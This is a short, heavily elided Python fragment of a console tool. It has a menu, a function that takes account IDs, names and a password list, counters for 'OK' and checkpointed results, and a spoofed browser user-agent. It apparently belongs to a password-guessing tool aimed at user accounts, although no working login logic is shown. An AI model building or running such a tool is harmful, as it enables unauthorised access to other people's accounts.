...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				linex()
				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (Chrome) ')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
...
def api1(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [Ox-M1] %s|\033[1;32mOK:-%s \033[1;35m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ox/112.0.0.0 Safari/537.36'}
